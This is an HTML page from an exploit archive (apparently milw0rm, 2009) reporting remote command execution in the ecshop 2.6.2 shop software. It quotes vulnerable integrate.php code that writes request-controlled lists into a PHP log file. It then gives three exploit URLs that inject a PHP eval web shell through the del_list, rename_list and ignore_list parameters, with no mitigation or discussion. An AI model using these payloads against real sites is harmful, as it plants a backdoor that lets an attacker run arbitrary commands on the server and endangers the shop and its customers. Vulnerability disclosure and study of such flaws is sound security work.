<html><head><title>ecshop 2.6.2 Multiple Remote Command Execution Vulnerabilities</title></head><pre> ######################### Securitylab.ir ########################
# Application Info:
# Name: ecshop
# Version: 2.6.2
# Website: http://www.ecshop.com
#################################################################
# Discoverd By: Securitylab.ir
# Website: http://securitylab.ir
# Contacts: info@securitylab[dot]ir &amp; K4mr4n_st@yahoo.com
#################################################################
#===========================================================
# :: integrate.php ::
#
# if ($_REQUEST['act'] == 'sync')
# {
# $size = 100;
# ......
# $tasks = array();
# if ($task_del &gt; 0)
# {
# $tasks[] = array('task_name'=&gt;sprintf($_LANG['task_del'], $task_del),'task_status'=&gt;'&lt;span id=&quot;task_del&quot;&gt;' . $_LANG['task_uncomplete'] . '&lt;span&gt;');
# $sql = &quot;SELECT user_name FROM &quot; . $ecs-&gt;table('users') . &quot; WHERE flag = 2&quot;;
# $del_list = $db-&gt;getCol($sql);//$del_list
# }
# if ($task_rename &gt; 0)
# {
# $tasks[] = array('task_name'=&gt;sprintf($_LANG['task_rename'], $task_rename),'task_status'=&gt;'&lt;span id=&quot;task_rename&quot;&gt;' . $_LANG['task_uncomplete'] . '&lt;/span&gt;');
# $sql = &quot;SELECT user_name, alias FROM &quot; . $ecs-&gt;table('users') . &quot; WHERE flag = 3&quot;;
# $rename_list = $db-&gt;getAll($sql);//$rename_list
# }
# if ($task_ignore &gt;0)
# {
# $sql = &quot;SELECT user_name FROM &quot; . $ecs-&gt;table('users') . &quot; WHERE flag = 4&quot;;
# $ignore_list = $db-&gt;getCol($sql);//$ignore_list
# }
# ....
# $fp = @fopen(ROOT_PATH . DATA_DIR . '/integrate_' . $_SESSION['code'] . '_log.php', 'wb');
# $log = '';
# if (isset($del_list))
# {
# $log .= '$del_list=' . var_export($del_list,true) . ';';
# }
# if (isset($rename_list))
# {
# $log .= '$rename_list=' . var_export($rename_list, true) . ';';
# }
# if (isset($ignore_list))
# {
# $log .= '$ignore_list=' . var_export($ignore_list, true) . ';';
# }
# fwrite($fp, $log);
# fclose($fp);
# $smarty-&gt;assign('tasks', $tasks);
# $smarty-&gt;assign('ur_here',$_LANG['user_sync']);
# $smarty-&gt;assign('size', $size);
# $smarty-&gt;display('integrates_sync.htm');
# }
#
#
# http://site.com/admin/integrate.php?act=sync&amp;del_list=&lt;?php%20eval($_POST[cmd])?&gt;
# http://site.com/admin/integrate.php?act=sync&amp;rename_list=&lt;?php%20eval($_POST[cmd])?&gt;
# http://site.com/admin/integrate.php?act=sync&amp;ignore_list=&lt;?php%20eval($_POST[cmd])?&gt;
#===========================================================
#################################################################
# Securitylab Security Research Team
###################################################################

# milw0rm.com [2009-05-29]</pre></html>